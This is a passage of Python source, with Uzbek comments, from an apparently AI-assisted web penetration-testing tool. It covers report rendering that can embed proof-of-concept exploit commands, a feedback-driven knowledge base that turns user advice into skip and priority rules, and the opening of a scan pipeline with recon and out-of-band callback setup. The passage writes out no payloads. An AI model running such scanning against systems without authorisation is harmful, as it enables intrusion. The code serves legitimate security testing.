        owasp_cnt = collections.Counter(f.owasp_id for f in confirmed)
        meta = meta or {}
        if generate_authorized_report:
            try:
                exported = generate_authorized_report(
                    target=self.target,
                    findings=confirmed,
                    report_dir=REPORT_DIR,
                    meta=meta,
                    template_path=meta.get("template_path") or "",
                    logger=lambda message: console.print(f"  [dim]{message}[/dim]"),
                )
                dp = exported.get("docx")
                pp = exported.get("pdf")
            except Exception as e:
                console.print(f"  [dim red]  DOCX/PDF report error: {e}[/dim red]")
        report_names = [fp.name, mp.name, hp.name]
        if dp:
            report_names.append(Path(dp).name)
        if pp:
            report_names.append(Path(pp).name)
        payload = {
            "target": self.target,
            "scan_date": datetime.datetime.now().isoformat(),
            "mode": meta.get("mode", ""),
            "deep": bool(meta.get("deep", False)),
            "speed": meta.get("speed", ""),
            "test_env": meta.get("test_env", ""),
            "summary": {
                "total": len(confirmed),
                "suppressed": len(suppressed),
                "by_risk": dict(risk_cnt),
                "by_owasp": dict(owasp_cnt),
            },
            "findings": [f.to_dict(safe=WEB_SAFE_REPORTS) for f in confirmed],
            "suppressed": [{"title": f.title, "url": f.url, "reason": f.suppression_reason} for f in suppressed],
            "scan_log": scan_log or [],
            "endpoint_analysis": endpoint_analysis or [],
            "ai_analysis": ai_analysis or "",
            "reports": report_names,
        }
        fp.write_text(json.dumps(payload, indent=2, default=str, ensure_ascii=False), encoding="utf-8")

        # Markdown
        mp.write_text(self._md(confirmed, suppressed), encoding="utf-8")

        # HTML
        hp.write_text(self._html(confirmed, suppressed), encoding="utf-8")

        console.print(f"\n[bold green]✅ Reports:[/bold green]")
        console.print(f"   🔍 JSON:     {fp}")
        console.print(f"   📄 Markdown: {mp}")
        console.print(f"   🌐 HTML:     {hp}")
        if dp:
            console.print(f"   DOCX:     {dp}")
        if pp:
            console.print(f"   PDF:      {pp}")
        return pp or dp or mp

    def _md(self, confirmed: List[Finding], suppressed: List[Finding]) -> str:
        ts   = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        lines = [
            f"# Pentest Report: {self.target}",
            f"**Date:** {ts}  ",
            f"**Total findings:** {len(confirmed)}  ",
            "", "## Executive Summary",
            "| Risk | Count |", "|------|-------|",
        ]
        rc = collections.Counter(f.risk for f in confirmed)
        for r in ["Critical","High","Medium","Low","Info"]:
            if rc.get(r): lines.append(f"| **{r}** | {rc[r]} |")
        lines += ["","---","## Findings"]
        for f in sorted(confirmed, key=lambda x: x.risk_idx()):
            lines += [
                f"", f"### [{f.risk}] {f.owasp_id} — {f.title}",
                f"- **URL:** `{f.url}`",
                f"- **Parameter:** `{f.param}`",
                f"- **Confidence:** {f.confidence}%",
                f"- **Confirmed:** {'✅' if f.confirmed else '⚠'}",
                f"", f"**Evidence:** {f.evidence}",
            ]
            if f.exploit_cmd and not WEB_SAFE_REPORTS:
                lines += ["**PoC:**","```bash",f.exploit_cmd,"```"]
            lines += [f"**Remediation:** {f.remediation}","","---"]
        if suppressed:
            lines += ["","## Suppressed (False Positives)"]
            for f in suppressed:
                lines += [f"- [{f.risk}] {f.title} — {f.suppression_reason}"]
        return "\n".join(lines)

    def _html(self, confirmed: List[Finding], suppressed: List[Finding]) -> str:
        ts       = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        rc       = collections.Counter(f.risk for f in confirmed)
        oc       = collections.Counter(f.owasp_id for f in confirmed)
        total    = len(confirmed)
        rcolors  = {"Critical":"#dc2626","High":"#ea580c","Medium":"#d97706",
                    "Low":"#2563eb","Info":"#6b7280"}

        cards = ""
        for idx, f in enumerate(sorted(confirmed, key=lambda x:x.risk_idx()), 1):
            c = rcolors.get(f.risk,"#6b7280")
            cb = '<span class="badge confirmed">Confirmed</span>' if f.confirmed \
                 else '<span class="badge unconfirmed">Unconfirmed</span>'
            ev = html_mod.escape(f.evidence or "—")
            rm = html_mod.escape(f.remediation or "")
            pc = ""
            if f.exploit_cmd and not WEB_SAFE_REPORTS:
                pc = f'<div class="code-block poc"><pre>{html_mod.escape(f.exploit_cmd)}</pre></div>'
            cards += f"""
<div class="finding-card" style="border-left:4px solid {c}">
  <div class="fh"><div>
    <span class="rb" style="background:{c}">{f.risk}</span>
    <span class="fn">#{idx}</span>
    <strong>{html_mod.escape(f.title)}</strong>
  </div>{cb}</div>
  <table class="mt">
    <tr><td>URL</td><td><code>{html_mod.escape(f.url)}</code></td></tr>
    <tr><td>Method</td><td><code>{f.method}</code></td></tr>
    <tr><td>Parameter</td><td><code>{html_mod.escape(f.param or '—')}</code></td></tr>
    <tr><td>OWASP</td><td>{f.owasp_id} — {html_mod.escape(f.owasp_name)}</td></tr>
    <tr><td>Confidence</td><td><div class="cb"><div class="cf" style="width:{f.confidence}%"></div></div> {f.confidence}%</td></tr>
  </table>
  <div class="s"><div class="st">Evidence</div><p>{ev}</p></div>
  {pc}
  <div class="s rem"><div class="st">Remediation</div><p>{rm}</p></div>
</div>"""

        rbars = ""
        for rn in ["Critical","High","Medium","Low","Info"]:
            cnt = rc.get(rn,0)
            if not cnt: continue
            pct = int(cnt/max(total,1)*100)
            rbars += f'<div class="cr"><span class="cl">{rn}</span><div class="cbb"><div class="cbf" style="width:{pct}%;background:{rcolors[rn]}"></div></div><span>{cnt}</span></div>'

        oitems = "".join(f'<div class="oi"><span class="oid">{k}</span><span>{v}</span></div>'
                         for k,v in sorted(oc.items(),key=lambda x:-x[1]))

        supp_rows = "".join(
            f'<tr><td><span class="rb" style="background:{rcolors.get(f.risk,"#6b7280")};font-size:.7rem">{f.risk}</span></td>'
            f'<td>{html_mod.escape(f.title)}</td><td>{html_mod.escape(f.suppression_reason or "")}</td></tr>'
            for f in suppressed
        )
        supp_section = f"""
<div class="sb"><h2>Suppressed ({len(suppressed)})</h2>
<table class="st2"><thead><tr><th>Risk</th><th>Title</th><th>Reason</th></tr></thead>
<tbody>{supp_rows}</tbody></table></div>""" if suppressed else ""

        return f"""<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Pentest Report — {html_mod.escape(self.target)}</title>
<style>
:root{{--bg:#0f172a;--s:#1e293b;--b:#334155;--t:#e2e8f0;--m:#94a3b8;--a:#38bdf8;--g:#22c55e}}
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:system-ui,sans-serif;background:var(--bg);color:var(--t);line-height:1.6}}
.container{{max-width:1100px;margin:0 auto;padding:2rem 1.5rem}}
.header{{background:linear-gradient(135deg,#1e293b,#0f172a);border:1px solid var(--b);border-radius:12px;padding:2.5rem;margin-bottom:2rem;text-align:center}}
.header h1{{font-size:1.8rem;color:var(--a);margin-bottom:.3rem}}
.header .target{{font-size:1.1rem;background:#0f172a;border-radius:6px;padding:.5rem 1rem;display:inline-block;margin-top:.8rem}}
.sg{{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:1rem;margin-bottom:2rem}}
.sc{{background:var(--s);border:1px solid var(--b);border-radius:10px;padding:1.2rem;text-align:center}}
.sc .num{{font-size:2rem;font-weight:700}}
.sc .lbl{{color:var(--m);font-size:.85rem;text-transform:uppercase;letter-spacing:.5px}}
.cs{{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;margin-bottom:2rem}}
.cb2{{background:var(--s);border:1px solid var(--b);border-radius:10px;padding:1.5rem}}
.cb2 h3{{margin-bottom:1rem;color:var(--a);font-size:1rem}}
.cr{{display:flex;align-items:center;margin-bottom:.5rem}}
.cl{{width:70px;font-size:.85rem;color:var(--m)}}
.cbb{{flex:1;height:18px;background:#0f172a;border-radius:4px;overflow:hidden;margin:0 .5rem}}
.cbf{{height:100%;border-radius:4px}}
.oi{{display:flex;justify-content:space-between;padding:.4rem 0;border-bottom:1px solid var(--b)}}
.oid{{font-weight:600;color:var(--a)}}
.sb{{margin-bottom:2rem}}
h2{{font-size:1.3rem;margin-bottom:1rem;padding-bottom:.5rem;border-bottom:2px solid var(--a)}}
.finding-card{{background:var(--s);border:1px solid var(--b);border-radius:10px;padding:1.5rem;margin-bottom:1.2rem}}
.fh{{display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem;flex-wrap:wrap;gap:.5rem}}
.fn{{color:var(--m);margin-right:.5rem}}
.rb{{display:inline-block;color:#fff;font-weight:700;border-radius:4px;padding:.2rem .6rem;font-size:.8rem;text-transform:uppercase;margin-right:.5rem}}
.badge{{display:inline-block;border-radius:4px;padding:.15rem .55rem;font-size:.78rem;font-weight:600}}
.badge.confirmed{{background:#166534;color:#bbf7d0}}
.badge.unconfirmed{{background:#713f12;color:#fef08a}}
.mt{{width:100%;border-collapse:collapse;margin-bottom:1rem}}
.mt td{{padding:.35rem .6rem;border-bottom:1px solid var(--b);font-size:.9rem}}
.mt td:first-child{{width:120px;color:var(--m);font-weight:600}}
.mt code{{background:#0f172a;padding:.15rem .4rem;border-radius:3px;font-size:.85rem;word-break:break-all}}
.cb{{display:inline-block;width:120px;height:8px;background:#0f172a;border-radius:4px;overflow:hidden;vertical-align:middle;margin-right:.4rem}}
.cf{{height:100%;background:var(--a);border-radius:4px}}
.s{{margin-bottom:.8rem}}
.st{{font-weight:700;color:var(--a);font-size:.9rem;margin-bottom:.25rem;text-transform:uppercase;letter-spacing:.5px}}
.s p{{font-size:.92rem;color:#cbd5e1}}
.rem{{background:#0c4a6e22;border-left:3px solid var(--a);padding:.8rem 1rem;border-radius:0 6px 6px 0}}
.code-block{{background:#0f172a;border:1px solid var(--b);border-radius:6px;margin:.5rem 0;overflow-x:auto}}
.code-block pre{{padding:.8rem 1rem;font-size:.82rem;white-space:pre-wrap;word-break:break-all}}
.poc{{border-color:var(--g)}}
.st2{{width:100%;border-collapse:collapse;font-size:.88rem}}
.st2 th{{text-align:left;padding:.5rem;background:#0f172a;color:var(--m);border-bottom:2px solid var(--b);font-weight:600}}
.st2 td{{padding:.5rem;border-bottom:1px solid var(--b)}}
.footer{{text-align:center;padding:2rem 0 1rem;color:var(--m);font-size:.8rem;border-top:1px solid var(--b);margin-top:2rem}}
@media(max-width:700px){{.cs{{grid-template-columns:1fr}}}}
</style></head><body><div class="container">
<div class="header">
  <h1>PENTEST AI v8.0 — Security Report</h1>
  <div style="color:var(--m)">Black Box Assessment</div>
  <div class="target">{html_mod.escape(self.target)}</div>
  <div style="color:var(--m);margin-top:.6rem">{ts}</div>
</div>
<div class="sg">
  <div class="sc"><div class="num" style="color:var(--a)">{total}</div><div class="lbl">Findings</div></div>
  <div class="sc"><div class="num" style="color:{rcolors['Critical']}">{rc.get('Critical',0)}</div><div class="lbl">Critical</div></div>
  <div class="sc"><div class="num" style="color:{rcolors['High']}">{rc.get('High',0)}</div><div class="lbl">High</div></div>
  <div class="sc"><div class="num" style="color:{rcolors['Medium']}">{rc.get('Medium',0)}</div><div class="lbl">Medium</div></div>
  <div class="sc"><div class="num" style="color:{rcolors['Low']}">{rc.get('Low',0)}</div><div class="lbl">Low</div></div>
</div>
<div class="cs">
  <div class="cb2"><h3>Risk Distribution</h3>{rbars}</div>
  <div class="cb2"><h3>OWASP Categories</h3>{oitems or '<p style="color:var(--m)">No findings</p>'}</div>
</div>
<div class="sb"><h2>Confirmed Vulnerabilities ({total})</h2>
{cards or '<p style="color:var(--m)">No confirmed vulnerabilities found.</p>'}
</div>
{supp_section}
<div class="footer">PENTEST AI v8.0 — Automated Security Assessment &middot; {ts}</div>
</div></body></html>"""


# ─────────────────────────────────────────────────────────────────────────────
# KNOWLEDGE BASE — User AI ga o'rgatadi, AI keyingi testlarda ishlatadi
# ─────────────────────────────────────────────────────────────────────────────
class KnowledgeBase:
    """
    Topshiriq 3: User AI bilan gaplashib:
    - Oldingi scan natijalarini muhokama qiladi
    - "Bu zaiflik emas", "Bu boshqacha test qilinishi kerak" deydi
    - AI bu maslahatni o'rganib, keyingi scan-larda ishlatadi

    knowledge.json faylida saqlanadi.
    Scan boshida yuklanadi, scan oxirida saqlanadi.

    FORMAT:
    {
      "lessons": [
        {
          "id": "uuid",
          "ts": "2025-01-01T00:00:00",
          "target": "http://example.com",
          "scan_id": "...",
          "type": "false_positive|technique|skip|priority|custom",
          "finding_title": "...",
          "user_feedback": "Bu zaiflik emas chunki...",
          "ai_analysis": "Understood. Next time will...",
          "rule": "machine-readable rule for scan engine",
          "applied_count": 0
        }
      ],
      "global_rules": [
        "Always test /api/v2 before /api/v1",
        "This target uses nginx — path traversal unlikely"
      ]
    }
    """

    KB_FILE = Path(__file__).parent / "pentest_reports" / "knowledge.json"

    def __init__(self, ai: "AIEngine"):
        self.ai      = ai
        self.lessons : list = []
        self.rules   : list = []
        self._load()

    # ── Disk I/O ──────────────────────────────────────────────────────────────
    def _load(self):
        try:
            if self.KB_FILE.exists():
                data          = json.loads(self.KB_FILE.read_text(encoding="utf-8"))
                self.lessons  = data.get("lessons", [])[-500:]
                self.rules    = data.get("global_rules", [])[:50]
                total = len(self.lessons)
                if total:
                    console.print(
                        f"[dim]  KnowledgeBase: {total} lesson(s) loaded[/dim]"
                    )
        except Exception as e:
            console.print(f"[dim red]  KnowledgeBase load error: {e}[/dim red]")

    def save(self):
        try:
            self.KB_FILE.parent.mkdir(parents=True, exist_ok=True)
            self.KB_FILE.write_text(
                json.dumps(
                    {"lessons": self.lessons, "global_rules": self.rules,
                     "last_updated": datetime.datetime.now().isoformat(),
                     "total_lessons": len(self.lessons)},
                    indent=2, ensure_ascii=False
                ),
                encoding="utf-8"
            )
        except Exception as e:
            console.print(f"[dim red]  KnowledgeBase save error: {e}[/dim red]")

    # ── Interactive Chat ──────────────────────────────────────────────────────
    def chat(self, scan_id: str = "", target: str = ""):
        """
        User AI bilan gaplashadi.
        Scan natijalarini ko'rib, maslahat beradi.
        AI o'rganadi va saqlab qo'yadi.
        """
        console.print("\n[bold cyan]━━ KNOWLEDGE BASE — AI ADVISOR ━━[/bold cyan]")
        console.print(
            "[dim]  AI bilan gaplashing. Oldingi scan natijalari haqida maslahat bering.\n"
            "  'quit' yoki 'exit' — chiqish\n"
            "  'show' — saqlangan darslar\n"
            "  'clear' — barcha darslarni o'chirish[/dim]\n"
        )

        history = []
        # Mavjud darslarni context sifatida berish
        existing_context = self._build_context(target)

        while True:
            try:
                user_input = input("[bold green]Siz:[/bold green] ").strip()
            except (EOFError, KeyboardInterrupt):
                break

            if not user_input:
                continue
            if user_input.lower() in ("quit", "exit", "q"):
                break
            if user_input.lower() == "show":
                self._show_lessons(target)
                continue
            if user_input.lower() == "clear":
                confirm = input("Hamma darslarni o'chirishni xohlaysizmi? [y/N]: ")
                if confirm.lower() == "y":
                    self.lessons = []
                    self.rules   = []
                    self.save()
                    console.print("[yellow]  O'chirildi.[/yellow]")
                continue

            history.append({"role": "user", "content": user_input})

            # AI javob beradi
            ai_response, extracted_rule = self._ai_respond(
                user_input, history, existing_context, target, scan_id
            )

            console.print(f"\n[cyan]AI:[/cyan] {ai_response}\n")
            history.append({"role": "assistant", "content": ai_response})

            # Rule extracted bo'lsa save qilish
            if extracted_rule:
                lesson = {
                    "id":            hashlib.md5(
                        (user_input + ai_response).encode()
                    ).hexdigest()[:12],
                    "ts":            datetime.datetime.now().isoformat(),
                    "target":        target,
                    "scan_id":       scan_id,
                    "type":          extracted_rule.get("type", "custom"),
                    "finding_title": extracted_rule.get("finding_title", ""),
                    "user_feedback": user_input[:500],
                    "ai_analysis":   ai_response[:500],
                    "rule":          extracted_rule.get("rule", ""),
                    "applied_count": 0,
                }
                self.lessons.append(lesson)
                self.save()
                console.print(
                    f"[green]  ✓ Dars saqlandi: {extracted_rule.get('rule','')}[/green]\n"
                )

        console.print("[dim]  Knowledge Base chat tugadi.[/dim]")

    def _ai_respond(self, user_msg: str, history: list,
                    context: str, target: str, scan_id: str) -> tuple:
        """AI javob beradi va strukturali rule chiqaradi."""
        prompt = f"""You are an expert penetration testing advisor.
The user is reviewing results from a scan and giving you feedback to improve future tests.

TARGET: {target or "unknown"}
SCAN ID: {scan_id or "unknown"}

EXISTING KNOWLEDGE (already learned):
{context or "No existing lessons yet."}

CONVERSATION HISTORY:
{json.dumps(history[-6:], ensure_ascii=False)}

USER'S LATEST MESSAGE: {user_msg}

YOUR TASKS:
1. Respond helpfully to the user's feedback in 2-4 sentences.
2. If the user is correcting a false positive — acknowledge and explain what was wrong.
3. If the user suggests a better technique — confirm and adapt.
4. If the user says something is not a vulnerability — agree and explain why.
5. Extract a machine-readable rule for future scans.

Return JSON:
{{
  "response": "Your conversational reply to the user (2-4 sentences, can be in Uzbek if user uses Uzbek)",
  "learned": true,
  "rule": {{
    "type": "false_positive|skip|technique|priority|custom",
    "finding_title": "exact finding title if applicable",
    "rule": "one-line machine-readable rule, e.g.: skip_test:sqli:url_contains:/static/",
    "applies_to": "all|this_target|this_scan"
  }}
}}"""

        if not HAS_OLLAMA:
            return ("AI mavjud emas. Lekin sizning fikringiz saqlandi.", None)

        try:
            raw = self.ai._chat_text(
                [
                    {"role":"system","content":
                     "You are an expert penetration tester. Respond concisely and professionally."},
                    {"role":"user","content":prompt},
                ],
                timeout_sec=AI_CALL_TIMEOUT_SEC,
            )
            clean  = re.sub(r"```json|```","",raw).strip()
            m      = re.search(r"\{.*\}", clean, re.DOTALL)
            if m:
                data = json.loads(m.group())
                response_text  = data.get("response","...")
                rule_data      = data.get("rule") if data.get("learned") else None
                return response_text, rule_data
            if clean:
                return clean, None
        except Exception:
            if 'clean' in locals() and clean:
                return clean, None
        return (f"Tushundim. '{user_msg[:50]}...' haqidagi fikringizni eslab qoldim.", None)

    def _show_lessons(self, target: str = ""):
        """Saqlangan darslarni ko'rsatish."""
        filtered = [l for l in self.lessons
                    if not target or l.get("target") == target or not l.get("target")]
        if not filtered:
            console.print("  [dim]Hech qanday dars yo'q.[/dim]")
            return
        console.print(f"\n  [bold]Saqlangan darslar ({len(filtered)}):[/bold]")
        for i, l in enumerate(filtered[-10:], 1):
            console.print(
                f"  {i}. [{l['type']}] {l['ts'][:10]} — "
                f"{l.get('rule','')[:70]}\n"
                f"     Feedback: {l.get('user_feedback','')[:60]}..."
            )

    @staticmethod
    def _target_key(value: str) -> str:
        raw = str(value or "").strip().lower()
        if not raw:
            return ""
        if "://" not in raw:
            raw = "http://" + raw
        try:
            p = urllib.parse.urlparse(raw)
            host = (p.netloc or "").strip().lower()
            path = (p.path or "").strip().rstrip("/").lower()
            return f"{host}{path}"
        except Exception:
            return str(value or "").strip().rstrip("/").lower()

    def _target_match(self, report_target: str, target: str) -> bool:
        a = self._target_key(report_target)
        b = self._target_key(target)
        if not a or not b:
            return False
        return a == b or a.startswith(b) or b.startswith(a)

    def _collect_target_report_snapshots(self, target: str, limit: int = 6) -> List[dict]:
        if not target:
            return []
        snapshots: List[dict] = []
        try:
            files = sorted(
                REPORT_DIR.glob("findings_*.json"),
                key=lambda p: p.stat().st_mtime,
                reverse=True,
            )
        except Exception:
            return snapshots

        for path in files:
            if len(snapshots) >= limit:
                break
            try:
                payload = json.loads(path.read_text(encoding="utf-8"))
            except Exception:
                continue
            if not isinstance(payload, dict):
                continue
            report_target = str(payload.get("target") or "")
            if not self._target_match(report_target, target):
                continue
            findings = payload.get("findings") if isinstance(payload.get("findings"), list) else []
            suppressed = payload.get("suppressed") if isinstance(payload.get("suppressed"), list) else []
            summary = payload.get("summary") if isinstance(payload.get("summary"), dict) else {}
            by_risk = summary.get("by_risk") if isinstance(summary.get("by_risk"), dict) else {}
            tools = sorted(
                {
                    str(f.get("tool", "")).strip()
                    for f in findings if isinstance(f, dict) and str(f.get("tool", "")).strip()
                }
            )
            top_findings = [
                str(f.get("title") or "")[:120]
                for f in findings[:8] if isinstance(f, dict) and str(f.get("title") or "")
            ]
            fp_titles = [
                str(s.get("title") or s.get("reason") or "")[:120]
                for s in suppressed[:6] if isinstance(s, dict)
            ]
            endpoint_analysis = payload.get("endpoint_analysis") if isinstance(payload.get("endpoint_analysis"), list) else []
            top_eps = sorted(
                [e for e in endpoint_analysis if isinstance(e, dict)],
                key=lambda e: float(e.get("score") or 0),
                reverse=True
            )[:8]
            snapshots.append({
                "scan_date": str(payload.get("scan_date") or ""),
                "summary_total": int(summary.get("total") or len(findings)),
                "summary_suppressed": int(summary.get("suppressed") or len(suppressed)),
                "by_risk": by_risk,
                "tools": tools[:12],
                "top_findings": top_findings,
                "fp_titles": fp_titles,
                "top_eps": [
                    f"{str(e.get('url') or '')} (score={int(float(e.get('score') or 0))}, tool={str(e.get('category') or '-')})"
                    for e in top_eps if str(e.get("url") or "")
                ],
            })
        return snapshots

    # ── Scan Integration ──────────────────────────────────────────────────────
    def build_scan_context(self, target: str) -> str:
        """
        Scan boshida chaqiriladi.
        Bu target uchun o'rganilgan darslarni string sifatida qaytaradi.
        AI prompt-lariga qo'shiladi.
        """
        relevant = [
            l for l in self.lessons
            if l.get("applies_to") == "all"
            or l.get("target") == target
            or not l.get("target")
        ]
        snapshots = self._collect_target_report_snapshots(target, limit=6)
        if not relevant and not snapshots:
            return ""

        lines: List[str] = [f"TARGET MEMORY CONTEXT: {target}"]
        if snapshots:
            scans = len(snapshots)
            total_findings = sum(int(s.get("summary_total", 0)) for s in snapshots)
            total_suppressed = sum(int(s.get("summary_suppressed", 0)) for s in snapshots)
            risk_rollup = collections.Counter()
            tools_rollup = collections.Counter()
            for s in snapshots:
                for r, c in (s.get("by_risk") or {}).items():
                    try:
                        risk_rollup[r] += int(c)
                    except Exception:
                        pass
                for t in s.get("tools") or []:
                    tools_rollup[str(t)] += 1

            lines.append(f"- Recent scans matched: {scans}")
            lines.append(f"- Findings total: {total_findings} | Suppressed/FP: {total_suppressed}")
            if risk_rollup:
                lines.append(
                    "- Risk rollup: " + ", ".join(f"{k}={risk_rollup[k]}" for k in ["Critical","High","Medium","Low","Info"] if risk_rollup.get(k))
                )
            if tools_rollup:
                top_tools = [t for t, _ in tools_rollup.most_common(10)]
                lines.append("- Tools used: " + ", ".join(top_tools))

            key_findings: List[str] = []
            key_fp: List[str] = []
            key_eps: List[str] = []
            for s in snapshots:
                key_findings.extend(s.get("top_findings") or [])
                key_fp.extend(s.get("fp_titles") or [])
                key_eps.extend(s.get("top_eps") or [])
            if key_findings:
                lines.append("- Top vulnerabilities seen before:")
                for item in key_findings[:12]:
                    lines.append(f"  * {item}")
            if key_fp:
                lines.append("- Known false-positive/suppressed patterns:")
                for item in key_fp[:10]:
                    lines.append(f"  * {item}")
            if key_eps:
                lines.append("- Previously important endpoints:")
                for item in key_eps[:10]:
                    lines.append(f"  * {item}")

        if relevant:
            lines.append("KNOWLEDGE BASE LESSONS:")
            for l in relevant[-20:]:
                lines.append(f"- [{l['type']}] {l.get('rule','')}")
                if l.get("finding_title"):
                    lines.append(f"  (re: '{l['finding_title']}')")
        return "\n".join(lines)[:12000]

    def should_skip(self, test_type: str, url: str, param: str = "") -> tuple:
        """
        Bu test skip qilinishi kerakmi?
        Returns: (should_skip: bool, reason: str)
        """
        for l in self.lessons:
            rule = l.get("rule","")
            if not rule.startswith("skip_test:"): continue
            # Format: skip_test:test_type:condition
            parts = rule.split(":")
            if len(parts) < 2: continue
            rule_test = parts[1] if len(parts) > 1 else ""
            condition = ":".join(parts[2:]) if len(parts) > 2 else ""

            if rule_test and rule_test != test_type and rule_test != "all":
                continue

            if not condition:
                return True, f"KB: {l.get('user_feedback','')[:60]}"
            if condition.startswith("url_contains:"):
                pattern = condition.replace("url_contains:","")
                if pattern in url:
                    l["applied_count"] = l.get("applied_count",0) + 1
                    return True, f"KB rule: {rule}"
            if condition.startswith("param_is:"):
                pattern = condition.replace("param_is:","")
                if pattern == param:
                    l["applied_count"] = l.get("applied_count",0) + 1
                    return True, f"KB rule: {rule}"
        return False, ""

    def get_priority_boost(self, url: str) -> int:
        """KB-da priority boost qoidalari bormi?"""
        for l in self.lessons:
            rule = l.get("rule","")
            if not rule.startswith("priority_boost:"): continue
            parts = rule.split(":")
            if len(parts) < 3: continue
            condition = parts[1]
            boost     = int(parts[2]) if parts[2].isdigit() else 0
            if condition in url:
                return boost
        return 0

    def _build_context(self, target: str) -> str:
        return self.build_scan_context(target)


# ─────────────────────────────────────────────────────────────────────────────
# MAIN PIPELINE
# ─────────────────────────────────────────────────────────────────────────────
class PentestPipeline:
    def __init__(self, args):
        self.args    = args
        self.session = SessionContext()
        self.client  = HTTPClient(self.session)
        self.ai      = AIEngine()
        self.ctx     = ScanContext()
        self.memory  = FailureMemory()
        self.ctx.memory = self.memory
        self.kb      = KnowledgeBase(self.ai)   # Knowledge Base
        self.oob     = OOBClient()
        self.reporter= Reporter("")

    @staticmethod
    def _equivalent_error_bucket(error: str) -> str:
        err = str(error or "").lower()
        if not err:
            return "empty"
        if "timeout" in err or "timed out" in err:
            return "timeout"
        if "ssl" in err or "tls" in err or "certificate" in err:
            return "tls"
        if "refused" in err or "reset" in err or "connection" in err:
            return "connection"
        if "name or service not known" in err or "getaddrinfo" in err or "dns" in err:
            return "dns"
        return err[:80]

    @staticmethod
    def _normalized_body_hash(body: str, max_chars: int = 2200) -> str:
        norm = re.sub(r"\d{2,}", "#", str(body or "").lower())
        norm = re.sub(r"\s+", " ", norm).strip()
        return hashlib.md5(norm[:max_chars].encode("utf-8", errors="replace")).hexdigest()

    def _agentic_equivalence_key(self, ep: Endpoint, resp: dict) -> Tuple[Optional[tuple], str]:
        if ep.method != "GET":
            return None, ""

        status = int(resp.get("status", 0) or 0)
        body = str(resp.get("body", ""))
        headers = resp.get("headers", {}) or {}
        profile = ResponseClassifier.classify(ep.url, headers, body, status)
        verdict = str(profile.get("verdict") or "unknown")
        ct = ResponseClassifier.normalize_content_type(headers)
        title = str(profile.get("title") or "").lower()[:120]

        sensitive_candidates = RiskScorer.score_body(body, url=ep.url, headers=headers)
        if RiskScorer.has_strong_sensitive_candidate(sensitive_candidates):
            return None, ""

        if status == 0:
            key = (
                "status0",
                self._equivalent_error_bucket(resp.get("error", "")),
                verdict,
                self._normalized_body_hash(body, max_chars=600),
            )
            return key, "equivalent unreachable response"

        if verdict in {"static_asset", "public_page", "login_page"}:
            key = (
                "generic",
                status,
                verdict,
                ct,
                title,
                self._normalized_body_hash(body),
            )
            return key, f"equivalent {verdict}"

        if status in (401, 403):
            key = (
                "blocked",
                status,
                verdict,
                ct,
                title,
                self._normalized_body_hash(body, max_chars=1600),
            )
            return key, "equivalent blocked/auth wall"

        if verdict == "unknown":
            # Same generic HTML/placeholder shell across many sensitive URLs should not
            # trigger separate agentic loops when the body is effectively identical.
            if (ct.startswith("text/html") or "<html" in body.lower() or "<body" in body.lower()) and len(body) <= 20000:
                key = (
                    "unknown_html",
                    status,
                    ct,
                    title,
                    self._normalized_body_hash(body),
                )
                return key, "equivalent generic HTML shell"
            if not body and status in (200, 204, 301, 302, 404):
                location = str(headers.get("location", "")).lower()[:180]
                key = ("empty", status, ct, location)
                return key, "equivalent empty response"

        return None, ""

    @staticmethod
    def _merge_endpoint_equivalence(rep: Endpoint, dup: Endpoint) -> None:
        rep.score = max(rep.score, dup.score)
        if not rep.template and dup.template:
            rep.template = dup.template
        if not rep.discovered_by and dup.discovered_by:
            rep.discovered_by = dup.discovered_by
        for key, value in (dup.params or {}).items():
            rep.params.setdefault(key, value)
        for key, value in (dup.headers or {}).items():
            rep.headers.setdefault(key, value)
        if dup.forms:
            rep.forms.extend([form for form in dup.forms if form not in rep.forms])

    def _collapse_equivalent_endpoints_for_agentic(
        self,
        endpoints: List[Endpoint],
        page_cache: dict,
    ) -> List[Endpoint]:
        if not endpoints:
            return endpoints

        kept: List[Endpoint] = []
        seen_clusters: Dict[tuple, Endpoint] = {}
        skipped: List[Tuple[str, str, str]] = []

        for ep in endpoints:
            resp = page_cache.get(ep.url)
            if resp is None and ep.method == "GET":
                resp = self.client.get(ep.url)
                page_cache[ep.url] = resp
            if resp is None:
                kept.append(ep)
                continue

            key, reason = self._agentic_equivalence_key(ep, resp)
            if not key:
                kept.append(ep)
                continue

            representative = seen_clusters.get(key)
            if representative is None:
                seen_clusters[key] = ep
                kept.append(ep)
                continue

            self._merge_endpoint_equivalence(representative, ep)
            skipped.append((ep.url, representative.url, reason))

        if skipped:
            console.print(
                f"  [yellow]  Agentic response dedupe: kept {len(kept)}/{len(endpoints)} "
                f"endpoint(s), skipped {len(skipped)} equivalent response(s)[/yellow]"
            )
            for dup_url, rep_url, reason in skipped[:5]:
                console.print(
                    f"  [dim]    skip {dup_url} -> same as {rep_url} ({reason})[/dim]"
                )
        return kept

    def run(self):
        raw = self.args.target.rstrip("/")
        self.ctx.target = raw
        scan_started_at = datetime.datetime.now()

        console.print(BANNER)
        self._print_tools_status()
        console.print(f"\n[bold]Target:[/bold] {raw}")
        console.print(f"[bold]Mode:[/bold]   {self.args.mode}")
        console.print(f"[bold]Deep:[/bold]   {self.args.deep}")

        # Knowledge Base context — oldingi o'rganilgan darslar
        kb_context = self.kb.build_scan_context(raw)
        if kb_context:
            console.print(f"\n[dim cyan]  📚 KB: {len(self.kb.lessons)} lesson(s) aktiv[/dim cyan]")
            # AI prompt-larga KB context qo'shish
            self.ai._kb_context = kb_context
        self.ctx.kb = self.kb

        # ── OOB setup ────────────────────────────────────────────────────────
        oob_domain = ""
        if getattr(self.args,"oob",False):
            console.print(f"\n[cyan]━━ OOB SETUP ━━[/cyan]")
            if self.oob.start():
                oob_domain = self.oob.domain
            else:
                console.print("  [dim yellow]interactsh-client not found[/dim yellow]")

        # ── Step 0: RECON ─────────────────────────────────────────────────────
        recon   = ReconEngine(self.ai)
        result  = recon.run(raw)
        target  = result.http_targets[0]["url"].rstrip("/") if result.http_targets \
                  else ("http://"+raw if not raw.startswith("http") else raw)
        self.reporter = Reporter(target)

        if result.waf not in ("none","unknown",""):
            console.print(f"\n  [bold yellow]⚠ WAF: {result.waf}[/bold yellow]")

